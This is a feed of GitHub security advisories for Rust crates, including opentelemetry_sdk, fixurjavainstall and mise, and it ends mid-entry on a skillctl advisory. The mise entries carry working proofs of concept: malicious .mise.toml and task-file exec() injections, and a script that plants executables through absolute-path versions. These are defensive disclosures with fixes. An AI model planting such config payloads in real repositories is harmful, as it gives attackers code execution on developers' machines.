<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2026-06-26T07:11:13.632Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[opentelemetry_sdk] opentelemetry_sdk has unbounded memory allocation in W3C Baggage propagation]]></title>
        <id>https://github.com/advisories/GHSA-w9wp-h8wv-79jx</id>
        <link href="https://github.com/advisories/GHSA-w9wp-h8wv-79jx"/>
        <updated>2026-06-25T18:40:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>BaggagePropagator::extract_with_context</code> in <code>opentelemetry_sdk</code> did not enforce the W3C Baggage size limits before parsing an inbound <code>baggage</code> header. A large attacker-controlled header could cause unnecessary CPU work and short-lived heap allocations while parsing entries that would later be discarded by the SDK's baggage storage limits.</p>
<p>The SDK now applies limits aligned with the W3C Baggage limits:</p>
<ul>
<li>64 list-members</li>
<li>8192 bytes total</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Services that accept untrusted inbound propagation headers may experience increased per-request resource usage when processing oversized <code>baggage</code> headers. This can contribute to denial-of-service risk, especially when application or transport-level header limits are absent or configured above the W3C Baggage limits.</p>
<p>The impact is limited to availability. This issue does not expose telemetry data, modify telemetry data, or allow code execution.</p>
<h2 id="patches">Patches</h2>
<p>Upgrade <code>opentelemetry_sdk</code> to version <code>0.32.1</code> or later.</p>
<p>Version <code>0.32.1</code> rejects <code>baggage</code> header values larger than 8192 bytes and limits extraction to the first 64 list-members.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading immediately is not possible, reject or limit inbound <code>baggage</code> headers larger than 8192 bytes before invoking OpenTelemetry propagation extraction. This can be enforced at a proxy, gateway, middleware layer, or custom carrier boundary.</p>
<h2 id="resources">Resources</h2>
<ul>
<li>W3C Baggage limits: <a href="https://www.w3.org/TR/baggage/#limits">https://www.w3.org/TR/baggage/#limits</a></li>
<li>Related OpenTelemetry Java advisory: <a href="https://github.com/open-telemetry/opentelemetry-java/security/advisories/GHSA-rcgg-9c38-7xpx">https://github.com/open-telemetry/opentelemetry-java/security/advisories/GHSA-rcgg-9c38-7xpx</a></li>
<li>Related OpenTelemetry Go advisory: <a href="https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-mh2q-q3fh-2475">https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-mh2q-q3fh-2475</a></li>
<li>CVE-2026-48504</li>
</ul>
<h2 id="credit">Credit</h2>
<p>tonghuaroot</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-telemetry/opentelemetry-rust/security/advisories/GHSA-w9wp-h8wv-79jx">https://github.com/open-telemetry/opentelemetry-rust/security/advisories/GHSA-w9wp-h8wv-79jx</a></li>
<li><a href="https://github.com/advisories/GHSA-w9wp-h8wv-79jx">https://github.com/advisories/GHSA-w9wp-h8wv-79jx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9wp-h8wv-79jx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-25T18:40:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fixurjavainstall] fixurjavainstall: Previous Fuji versions can accidentally wipe `/usr/share/man/man8`]]></title>
        <id>https://github.com/advisories/GHSA-fq3w-p4fg-mw73</id>
        <link href="https://github.com/advisories/GHSA-fq3w-p4fg-mw73"/>
        <updated>2026-06-25T18:00:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Affects: Anyone who generates the UNIX man pages in Fuji &lt;= <code>0.8.0</code> build with the <code>dev</code> crate feature.
Consequences: <code>/usr/share/man/man8</code> may be entirely removed &amp; re-created without any of the previous entries.</p>
<h3 id="patches">Patches</h3>
<p>At the time of writing, no new version has been released on crates.io, due to an unrelated CI/CD publishing issue.
Due to the same unrelated publishing issue, no new GitHub Releases version has been released.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not run <code>fuji manual</code> on non-<code>dev</code> builds for versions &lt;= <code>0.8.0</code>.</p>
<h3 id="additional-information">Additional Information</h3>
<p>This bug results from development-only code being accidentally left in for release use.
Previous versions of Fuji are still "safe" to use, provided that you do not run <code>fuji manual</code>.
There is no malicious potential from this, it's just a major annoyance to accidentally remove all your sysadmin man pages.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/EpicVon2468/fixurjavainstall/security/advisories/GHSA-fq3w-p4fg-mw73">https://github.com/EpicVon2468/fixurjavainstall/security/advisories/GHSA-fq3w-p4fg-mw73</a></li>
<li><a href="https://github.com/advisories/GHSA-fq3w-p4fg-mw73">https://github.com/advisories/GHSA-fq3w-p4fg-mw73</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fq3w-p4fg-mw73</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-25T18:00:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mise] Mise's local credential_command executes untrusted config]]></title>
        <id>https://github.com/advisories/GHSA-29hf-rm4x-xxph</id>
        <link href="https://github.com/advisories/GHSA-29hf-rm4x-xxph"/>
        <updated>2026-06-23T18:24:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>mise</code> loads <code>github.credential_command</code> from local project config before any trust decision, then executes that value with <code>sh -c</code> when resolving a GitHub token. An attacker who can place a <code>.mise.toml</code> in a repository can execute arbitrary shell commands when the victim runs a GitHub-related mise command and no higher-priority GitHub token environment variable is set.</p>
<p>The current command-execution path is <code>github.credential_command</code>. I confirmed in Docker that the setting is exploitable on <code>v2026.3.15</code> and <code>v2026.3.17</code>, while <code>v2026.3.14</code> rejects it as an unknown field. This report does not depend on the separate trust-bypass issue because the sink is reached directly from <code>[settings.github]</code>.</p>
<h3 id="details">Details</h3>
<p>The vulnerable load order is:</p>
<ol>
<li><a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/settings.rs#L254-L283"><code>Settings::try_get()</code></a> preloads settings from local config files.</li>
<li><a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/settings.rs#L505-L510"><code>parse_settings_file()</code></a> returns <code>settings_file.settings</code> without checking whether the local file is trusted.</li>
<li><a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/github.rs#L344-L390"><code>resolve_token()</code></a> checks <code>settings.github.credential_command</code> after the token env vars and before file-based sources.</li>
<li><a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/github.rs#L558-L599"><code>get_credential_command_token()</code></a> executes the value with <code>sh -c</code>.</li>
</ol>
<p>The main command-execution path is:</p>
<pre><code class="language-rust">let result = std::process::Command::new("sh")
    .arg("-c")
    .arg(cmd)
    .arg("mise-credential-helper")
    .arg(host)
    .output()
</code></pre>
<p>If a local project file sets:</p>
<pre><code class="language-toml">[settings.github]
credential_command = "echo credential_command_rce &gt; /tmp/mise-proof.txt; echo ghp_fake_token"
</code></pre>
<p>then <code>resolve_token()</code> will reach <code>get_credential_command_token()</code> whenever higher-priority GitHub token environment variables are unset. <code>credential_command</code> is a documented custom credential source for mise, but it is also accepted from a local project <code>.mise.toml</code>, which lets an untrusted repository supply a shell command for mise to execute.</p>
<h3 id="poc">PoC</h3>
<p>Test environment:</p>
<ul>
<li>Docker</li>
<li><code>linux-arm64</code></li>
<li><code>mise v2026.3.17</code></li>
</ul>
<p>Negative control:</p>
<pre><code class="language-bash">export GITHUB_TOKEN=env_token
mise github token --unmask
</code></pre>
<p>Observed:</p>
<pre><code class="language-text">github.com: env_token (source: GITHUB_TOKEN)
/tmp/mise-proof.txt =&gt; missing
</code></pre>
<p>Primary exploit:</p>
<pre><code class="language-toml">[settings.github]
credential_command = "echo credential_command_rce &gt; /tmp/mise-proof.txt; echo ghp_fake_token"
</code></pre>
<p>Run:</p>
<pre><code class="language-bash">unset GITHUB_TOKEN GITHUB_API_TOKEN MISE_GITHUB_TOKEN MISE_GITHUB_ENTERPRISE_TOKEN
mise github token --unmask
</code></pre>
<p>Observed:</p>
<pre><code class="language-text">github.com: ghp_fake_token (source: credential_command)
</code></pre>
<p>And the side effect file is created:</p>
<pre><code class="language-text">/tmp/mise-proof.txt =&gt; credential_command_rce
</code></pre>
<p>Related version check:</p>
<ul>
<li><code>v2026.3.14</code>: <code>credential_command</code> is rejected as an unknown field</li>
<li><code>v2026.3.15</code>: the same PoC executes and returns <code>source: credential_command</code></li>
</ul>
<h3 id="impact">Impact</h3>
<p>An attacker who can place a <code>.mise.toml</code> in a repository can execute arbitrary shell commands as the victim user when the victim runs a mise command that resolves a GitHub token from local settings.</p>
<p>Demonstrated impact:</p>
<ul>
<li>arbitrary command execution as the victim user</li>
<li>no trust prompt</li>
<li>no need for <code>[env]</code>, <code>[hooks]</code>, tasks, or templates</li>
</ul>
<p>Important limitation:</p>
<ul>
<li>if a higher-priority GitHub token environment variable is already set, the <code>credential_command</code> path is not reached</li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Do not honor <code>github.credential_command</code> from non-global project config files.</p>
<p>For example, inside <code>parse_settings_file()</code>:</p>
<pre><code class="language-rust">pub fn parse_settings_file(path: &amp;Path) -&gt; Result&lt;SettingsPartial&gt; {
    let raw = file::read_to_string(path)?;
    let settings_file: SettingsFile = toml::from_str(&amp;raw)?;
    let mut settings = settings_file.settings;

    if !config::is_global_config(path) {
        settings.github.credential_command = None;
    }

    Ok(settings)
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jdx/mise/security/advisories/GHSA-29hf-rm4x-xxph">https://github.com/jdx/mise/security/advisories/GHSA-29hf-rm4x-xxph</a></li>
<li><a href="https://github.com/advisories/GHSA-29hf-rm4x-xxph">https://github.com/advisories/GHSA-29hf-rm4x-xxph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-29hf-rm4x-xxph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-23T18:24:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mise] Mise vulnerable to arbitrary command execution via task-include files in an untrusted, config-less repository]]></title>
        <id>https://github.com/advisories/GHSA-77g9-363w-rccq</id>
        <link href="https://github.com/advisories/GHSA-77g9-363w-rccq"/>
        <updated>2026-06-23T18:24:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>mise's trust feature gates config files (<code>mise.toml</code>, <code>.tool-versions</code>) through <code>trust_check</code>, but task-include files are loaded on a path that never reaches it. When a directory has a task-include dir (<code>mise-tasks/</code>, <code>.mise/tasks/</code>, …) but no config file, mise falls back to the default includes and renders each task's tera fields — and that tera environment has <code>exec()</code> registered. A <code>{{ exec(command='…') }}</code> in any rendered field runs arbitrary commands the moment the tasks are merely listed. There's no config file to gate on, so no trust prompt ever appears. Read-only commands trigger it: <code>mise tasks</code>, <code>mise task ls</code>, <code>mise run</code>, <code>mise tasks --usage</code> (the query shell completion runs on Tab). The victim only has to <code>cd</code> into a cloned repo and list or tab-complete a task</p>
<h2 id="details">Details</h2>
<p>Trust is enforced only inside config-file parsing:</p>
<ul>
<li><code>src/config/config_file/mise_toml.rs:276</code> — <code>MiseToml::from_str</code> → <code>trust_check(path)?</code></li>
<li><code>src/config/config_file/tool_versions.rs:62</code> — <code>.tool-versions</code> parser → <code>trust_check(&amp;path)?</code></li>
<li><code>src/config/env_directive/mod.rs:681</code> — env templates → <code>trust_check(path)?</code> (only when the value contains template syntax)</li>
</ul>
<p>Task-include files are loaded by <code>load_tasks_in_dir</code> / <code>load_local_tasks_with_context</code>,
which walk every directory from CWD up to root. For each directory, <code>configs_at_root</code>
returns the parsed (trusted) configs rooted there; <strong>if there is no config in the
directory</strong>, mise falls back to the default task-include list resolved relative to that
directory and loads whatever it finds — with no trust check:</p>
<p><code>src/config/mod.rs</code> (<code>load_tasks_in_dir</code>, ~2586):</p>
<pre><code class="language-rust">let (includes, resolve_dir) = configs
    .iter()
    .find_map(|cf| match cf.task_config_includes() { … })
    .transpose()?
    .unwrap_or_else(|| (default_task_includes(), dir.to_path_buf())); // no config -&gt; default includes
…
for include in &amp;includes {
    let paths = … expand_task_include(&amp;resolve_dir, include);
    for p in paths {
        let mut loaded = load_tasks_includes(config, &amp;p, dir, &amp;task_config_dir, templates).await?;
        …
    }
}
</code></pre>
<p><code>default_task_includes()</code> (<code>src/config/mod.rs:1825</code>):</p>
<pre><code class="language-rust">vec!["mise-tasks", ".mise-tasks", ".mise/tasks", ".config/mise/tasks", "mise/tasks"]
</code></pre>
<p><code>load_task_file</code> (<code>src/config/mod.rs:2645</code>) reads the TOML directly with no trust check
and renders each task:</p>
<pre><code class="language-rust">let raw = file::read_to_string_async(path).await?;
let mut tasks = toml::from_str::&lt;Tasks&gt;(&amp;raw) … ;        // no trust_check
…
resolve_task_template(&amp;mut task, templates)?;
if let Err(err) = task.render(config, &amp;config_root).await { … }  // renders tera, incl. exec()
</code></pre>
<p><code>Task::render</code> (<code>src/task/mod.rs:1475</code>) renders many fields through tera, and the tera
instance is built with <code>get_tera(Some(config_root))</code>:</p>
<pre><code class="language-rust">let mut tera = get_tera(Some(config_root));
…
if contains_template_syntax(&amp;self.description) {
    self.description = render_str(&amp;mut tera, &amp;self.description, &amp;tera_ctx)?;
}
</code></pre>
<p><code>get_tera</code> (<code>src/tera.rs:407</code>) registers the command-executing functions:</p>
<pre><code class="language-rust">pub fn get_tera(dir: Option&lt;&amp;Path&gt;) -&gt; Tera {
    let mut tera = TERA.clone();
    let dir = dir.map(PathBuf::from);
    tera.register_function("exec", tera_exec(dir.clone(), env::PRISTINE_ENV.clone()));
    tera.register_function("read_file", tera_read_file(dir));
    tera
}
</code></pre>
<p>So a tera <code>{{ exec(command='…') }}</code> placed in any rendered task field
(<code>description</code>, <code>dir</code>, <code>shell</code>, <code>sources</code>, <code>aliases</code>, <code>depends</code>, <code>tools</code>, …) of a TOML
task file — or in a <code>#MISE description="…"</code> header of an executable script task
(<code>Task::from_path</code>) — executes when the task is merely <em>loaded for listing</em>, with no
trust prompt. <code>exec()</code> is not gated by <code>experimental</code> (default <code>experimental = false</code>).</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Tested against the prebuilt release binary, <code>mise 2026.6.4 linux-x64</code>, with a
pristine <code>HOME</code> so nothing is pre-trusted.</p>
<p>Repo layout :</p>
<pre><code>malicious-repo/
└── mise-tasks/
    └── ci.toml
</code></pre>
<p><code>mise-tasks/ci.toml</code>:</p>
<pre><code class="language-toml">[test]
description = "{{ exec(command='id &gt; /tmp/mise_clone_proof.txt; hostname &gt;&gt; /tmp/mise_clone_proof.txt') }}"
run = "cargo test"
</code></pre>
<p>Trigger (any of these; a victim who has <code>mise activate</code> set up hits the last one by just
pressing Tab to complete a task name):</p>
<pre><code class="language-bash">export HOME="$(mktemp -d)"          # nothing pre-trusted
export MISE_TRUSTED_CONFIG_PATHS=""
cd malicious-repo
mise tasks            # or: mise task ls / mise run / mise tasks --usage
</code></pre>
<p>output:</p>
<pre><code>test
</code></pre>
<p>and the side effect :</p>
<pre><code>miau@linux:~$ cat /tmp/mise_clone_proof.txt
uid=1000(miau) gid=1000(miau) groups=1000(miau)…
linux 
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jdx/mise/security/advisories/GHSA-77g9-363w-rccq">https://github.com/jdx/mise/security/advisories/GHSA-77g9-363w-rccq</a></li>
<li><a href="https://github.com/advisories/GHSA-77g9-363w-rccq">https://github.com/advisories/GHSA-77g9-363w-rccq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-77g9-363w-rccq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-23T18:24:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mise] mise HTTP backend uses raw version path for install symlink destination]]></title>
        <id>https://github.com/advisories/GHSA-f94h-j2qg-fxw3</id>
        <link href="https://github.com/advisories/GHSA-f94h-j2qg-fxw3"/>
        <updated>2026-06-23T18:13:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The mise HTTP backend builds its install symlink destination from the raw resolved version string for non-latest versions. Normal tool install paths use the sanitized version pathname, but the HTTP backend's symlink path uses the raw value. On Unix-like systems, if that version is an absolute path, <code>PathBuf::join</code> discards the intended mise installs root.</p>
<p>A repository-controlled <code>.tool-versions</code> file can therefore make <code>mise install</code> create a symlink outside the mise install tree. With <code>bin_path</code>, the same issue can place an executable symlink under an attacker-selected absolute prefix, such as a developer-tool prefix that is later added to <code>PATH</code>.</p>
<p>The reproducer below also models a CI/developer workflow where a later step executes a preexisting trusted command from a user-local <code>PATH</code> prefix. The absolute-version HTTP entry replaces that command with a symlink to downloaded HTTP content. A non-absolute version control does not replace the trusted <code>PATH</code> command.</p>
<h2 id="affected-code">Affected Code</h2>
<p>In <code>src/backend/http.rs</code>, <code>create_install_symlink()</code> derives the destination path from raw <code>tv.version</code>:</p>
<pre><code class="language-rust">let version_name = if tv.version == "latest" || tv.version.is_empty() {
    &amp;cache_key[..7.min(cache_key.len())]
} else {
    &amp;tv.version
};

let install_path = tv.ba().installs_path.join(version_name);
</code></pre>
<p><code>ToolVersion::tv_pathname()</code> already sanitizes <code>:</code> and <code>/</code> for filesystem version directory names, but this HTTP backend path does not use it.</p>
<h2 id="impact">Impact</h2>
<p>Proven:</p>
<ul>
<li>Outside-root symlink creation from a repository-controlled <code>.tool-versions</code> entry.</li>
<li>Executable symlink materialization under an attacker-selected absolute prefix when <code>bin_path</code> is configured.</li>
<li>The executable symlink can be run if that prefix's <code>bin</code> directory is on <code>PATH</code>.</li>
<li>Replacement of a preexisting command in a trusted <code>PATH</code> prefix in a local workflow-chain model, followed by execution of the replaced command by name.</li>
</ul>
<p>Not claimed:</p>
<ul>
<li><code>mise install</code> does not automatically execute the placed binary in the reproducer.</li>
<li>Windows drive-letter absolute paths are not claimed; the demonstrated impact is Unix-like path behavior.</li>
<li>Credential theft is not claimed.</li>
</ul>
<h2 id="why-this-crosses-a-boundary">Why This Crosses A Boundary</h2>
<p><code>.tool-versions</code> is an asdf-compatible project file and is parsed without the <code>mise.toml</code> trust gate used for configuration features that can execute code or affect the environment. Even if a project can choose tools to install, an install operation should keep HTTP backend materialization under the selected mise install/cache roots unless the user explicitly performs a trusted link or path operation.</p>
<p>The HTTP backend documentation describes HTTP tool installations as symlinks under the mise installs directory, for example:</p>
<pre><code class="language-text">$MISE_DATA_DIR/installs/http-my-tool/1.0.0 -&gt; $MISE_CACHE_DIR/http-tarballs/...
</code></pre>
<p>The observed behavior instead allows the project version string to choose an absolute install destination.</p>
<h2 id="reproduction">Reproduction</h2>
<p>The script below performs three local checks:</p>
<ol>
<li>It creates a <code>.tool-versions</code> entry whose HTTP backend version is an absolute path, then confirms that mise creates a symlink at that outside path.</li>
<li>It creates a second HTTP backend entry with <code>bin_path=bin</code> and confirms that mise places an executable symlink under an attacker-selected absolute prefix and that the symlink is executable when the prefix's <code>bin</code> directory is on <code>PATH</code>.</li>
<li>It creates a preexisting trusted command in a user-local <code>PATH</code> prefix, runs <code>mise install</code> from a project <code>.tool-versions</code> file, and confirms the later trusted command execution is replaced only in the absolute-version case. A non-absolute version control leaves the preexisting command in place.</li>
</ol>
<p>The script uses a loopback HTTP server and temporary directories only.</p>
<pre><code class="language-sh">#!/bin/sh
set -eu

if ! command -v mise &gt;/dev/null 2&gt;&amp;1; then
  echo "mise must be on PATH" &gt;&amp;2
  exit 1
fi

if ! command -v python3 &gt;/dev/null 2&gt;&amp;1; then
  echo "python3 must be on PATH for the loopback HTTP server" &gt;&amp;2
  exit 1
fi

ROOT="$(mktemp -d)"
OUT="$ROOT/out"
DATA="$ROOT/data"
CACHE="$ROOT/cache"
STATE="$ROOT/state"
CONFIG="$ROOT/config"
WWW="$ROOT/www"

cleanup() {
  if [ -n "${SERVER_PID:-}" ]; then
    kill "$SERVER_PID" 2&gt;/dev/null || true
  fi
  rm -rf "$ROOT"
}
trap cleanup EXIT

mkdir -p "$OUT" "$DATA" "$CACHE" "$STATE" "$CONFIG" "$WWW"

cat &gt; "$WWW/payload" &lt;&lt;'PAYLOAD'
#!/bin/sh
if [ -n "${CHAIN_MARKER:-}" ]; then
  echo ATTACKER_CONTROLLED_TRUSTED_COMMAND &gt; "$CHAIN_MARKER"
else
  echo MISE_HTTP_ABSOLUTE_VERSION_EXECUTED &gt; "$MISE_HTTP_ABSOLUTE_VERSION_MARKER"
fi
PAYLOAD
chmod +x "$WWW/payload"

(
  cd "$WWW"
  python3 -m http.server 54321 --bind 127.0.0.1 &gt;/dev/null 2&gt;&amp;1
) &amp;
SERVER_PID=$!
sleep 1

PROJECT1="$ROOT/project-host-write"
mkdir -p "$PROJECT1"
cat &gt; "$PROJECT1/.tool-versions" &lt;&lt;EOF1
http:absolute-version-one[url=http://127.0.0.1:54321/payload,bin=owned-one] $OUT/owned-link
EOF1

(
  cd "$PROJECT1"
  MISE_DATA_DIR="$DATA" \
  MISE_CACHE_DIR="$CACHE" \
  MISE_STATE_DIR="$STATE" \
  MISE_CONFIG_DIR="$CONFIG" \
  MISE_YES=1 \
  mise install --yes
)

if [ ! -L "$OUT/owned-link" ]; then
  echo "FAIL: outside symlink was not created" &gt;&amp;2
  exit 1
fi

PROJECT2="$ROOT/project-bin-path"
mkdir -p "$PROJECT2"
cat &gt; "$PROJECT2/.tool-versions" &lt;&lt;EOF2
http:absolute-version-two[url=http://127.0.0.1:54321/payload,bin=ownedcmd,bin_path=bin] $OUT/selected-prefix
EOF2

rm -rf "$DATA" "$CACHE" "$STATE" "$CONFIG"
mkdir -p "$DATA" "$CACHE" "$STATE" "$CONFIG"

(
  cd "$PROJECT2"
  MISE_DATA_DIR="$DATA" \
  MISE_CACHE_DIR="$CACHE" \
  MISE_STATE_DIR="$STATE" \
  MISE_CONFIG_DIR="$CONFIG" \
  MISE_YES=1 \
  mise install --yes
)

if [ ! -L "$OUT/selected-prefix/bin/ownedcmd" ]; then
  echo "FAIL: executable symlink was not created under selected prefix" &gt;&amp;2
  exit 1
fi

MARKER="$OUT/executed-marker"
MISE_HTTP_ABSOLUTE_VERSION_MARKER="$MARKER" \
PATH="$OUT/selected-prefix/bin:$PATH" \
ownedcmd

if ! grep -q MISE_HTTP_ABSOLUTE_VERSION_EXECUTED "$MARKER"; then
  echo "FAIL: executable symlink did not run" &gt;&amp;2
  exit 1
fi

echo "VULNERABLE_BEHAVIOR_CONFIRMED"
echo "outside symlink: $OUT/owned-link -&gt; $(readlink "$OUT/owned-link")"
echo "path executable: $OUT/selected-prefix/bin/ownedcmd -&gt; $(readlink "$OUT/selected-prefix/bin/ownedcmd")"

run_path_chain_case() {
  case_name="$1"
  version="$2"
  expected="$3"

  CASE_ROOT="$ROOT/$case_name"
  HOME_DIR="$CASE_ROOT/home"
  CASE_DATA="$CASE_ROOT/data"
  CASE_CACHE="$CASE_ROOT/cache"
  CASE_STATE="$CASE_ROOT/state"
  CASE_CONFIG="$CASE_ROOT/config"
  CASE_PROJECT="$CASE_ROOT/project"
  CASE_MARKER="$CASE_ROOT/marker"

  if [ "$version" = "__HOME_LOCAL_PREFIX__" ]; then
    version="$HOME_DIR/.local"
  fi

  mkdir -p "$HOME_DIR/.local/bin" "$CASE_DATA" "$CASE_CACHE" "$CASE_STATE" "$CASE_CONFIG" "$CASE_PROJECT"
  cat &gt; "$HOME_DIR/.local/bin/trustedcmd" &lt;&lt;'SAFE'
#!/bin/sh
echo SAFE_PREEXISTING_TRUSTED_COMMAND &gt; "$CHAIN_MARKER"
SAFE
  chmod +x "$HOME_DIR/.local/bin/trustedcmd"

  cat &gt; "$CASE_PROJECT/.tool-versions" &lt;&lt;EOF3
http:path-chain[url=http://127.0.0.1:54321/payload,bin=trustedcmd,bin_path=bin] $version
EOF3

  (
    cd "$CASE_PROJECT"
    HOME="$HOME_DIR" \
    MISE_DATA_DIR="$CASE_DATA" \
    MISE_CACHE_DIR="$CASE_CACHE" \
    MISE_STATE_DIR="$CASE_STATE" \
    MISE_CONFIG_DIR="$CASE_CONFIG" \
    MISE_YES=1 \
    mise install --yes
  )

  CHAIN_MARKER="$CASE_MARKER" \
  PATH="$HOME_DIR/.local/bin:$PATH" \
  trustedcmd

  observed="$(cat "$CASE_MARKER")"
  if [ "$observed" != "$expected" ]; then
    echo "FAIL: $case_name expected $expected but saw $observed" &gt;&amp;2
    exit 1
  fi

  if [ "$case_name" = "path-chain-vulnerable" ] &amp;&amp; [ ! -L "$HOME_DIR/.local/bin/trustedcmd" ]; then
    echo "FAIL: path-chain case did not replace trustedcmd with a symlink" &gt;&amp;2
    exit 1
  fi
}

run_path_chain_case path-chain-vulnerable "__HOME_LOCAL_PREFIX__" ATTACKER_CONTROLLED_TRUSTED_COMMAND
run_path_chain_case path-chain-control "1.0.0" SAFE_PREEXISTING_TRUSTED_COMMAND

echo "PATH_CHAIN_CONFIRMED"
</code></pre>
<p>Expected vulnerable markers:</p>
<pre><code class="language-text">VULNERABLE_BEHAVIOR_CONFIRMED
PATH_CHAIN_CONFIRMED
</code></pre>
<h2 id="candidate-fix">Candidate Fix</h2>
<p>Use <code>tv.tv_pathname()</code> for non-latest HTTP install symlink names, preserving the current content-addressed behavior for <code>latest</code> or empty versions.</p>
<pre><code class="language-diff">diff --git a/src/backend/http.rs b/src/backend/http.rs
index 4e4e972..18cf8a1 100644
--- a/src/backend/http.rs
+++ b/src/backend/http.rs
@@ -518,12 +518,12 @@ impl HttpBackend {

         // Determine version name for install path
         let version_name = if tv.version == "latest" || tv.version.is_empty() {
-            &amp;cache_key[..7.min(cache_key.len())] // Content-based versioning
+            cache_key[..7.min(cache_key.len())].to_string() // Content-based versioning
         } else {
-            &amp;tv.version
+            tv.tv_pathname()
         };

-        let install_path = tv.ba().installs_path.join(version_name);
+        let install_path = tv.ba().installs_path.join(&amp;version_name);

         // Clean up existing install
         if install_path.exists() {
@@ -839,3 +839,51 @@ impl Backend for HttpBackend {
         }
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::cli::args::{BackendArg, BackendResolution};
+    use crate::toolset::{ToolRequest, ToolSource, ToolVersionOptions};
+
+    fn http_test_tv(version: &amp;str) -&gt; ToolVersion {
+        let backend = Arc::new(BackendArg::new_raw(
+            "http-absolute-version".to_string(),
+            Some("http:absolute-version".to_string()),
+            "absolute-version".to_string(),
+            None,
+            BackendResolution::new(true),
+        ));
+        let request = ToolRequest::Version {
+            backend,
+            version: version.to_string(),
+            options: ToolVersionOptions::default(),
+            source: ToolSource::Argument,
+        };
+        ToolVersion::new(request, version.to_string())
+    }
+
+    #[test]
+    fn install_symlink_path_uses_sanitized_version_pathname() {
+        let tv = http_test_tv("/outside-root/mise-http-version-out/selected-prefix");
+
+        assert_eq!(
+            tv.tv_pathname(),
+            "-outside-root-mise-http-version-out-selected-prefix"
+        );
+        assert!(!Path::new(&amp;tv.tv_pathname()).is_absolute());
+    }
+
+    #[test]
+    fn latest_install_symlink_still_uses_content_version() {
+        let tv = http_test_tv("latest");
+        let cache_key = "abcdef123456";
+        let version_name = if tv.version == "latest" || tv.version.is_empty() {
+            cache_key[..7.min(cache_key.len())].to_string()
+        } else {
+            tv.tv_pathname()
+        };
+
+        assert_eq!(version_name, "abcdef1");
+    }
+}
</code></pre>
<p>Reporter: JUNYI LIU</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jdx/mise/security/advisories/GHSA-f94h-j2qg-fxw3">https://github.com/jdx/mise/security/advisories/GHSA-f94h-j2qg-fxw3</a></li>
<li><a href="https://github.com/advisories/GHSA-f94h-j2qg-fxw3">https://github.com/advisories/GHSA-f94h-j2qg-fxw3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f94h-j2qg-fxw3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-23T18:13:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[skillctl] skillctl: argument injection, path traversal in --dest, FIFO/device DoS, hardlink exfiltration, and commit-trailer forgery]]></title>
        <id>https://github.com/advisories/GHSA-74p7-6h78-gw8p</id>
        <link href="https://github.com/advisories/GHSA-74p7-6h78-gw8p"/>
        <updated>2026-06-22T22:45:16.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>Following the path-safety patches in <a href="https://github.com/umanio-agency/skillctl/security/advisories/GHSA-wx3m-whqv-xv47">GHSA-wx3m-whqv-xv47</a> (v0.1.2), a comprehensive multi-angle audit surfaced five further vulnerabilities, now patched in v0.1.3:</p>
<ol>
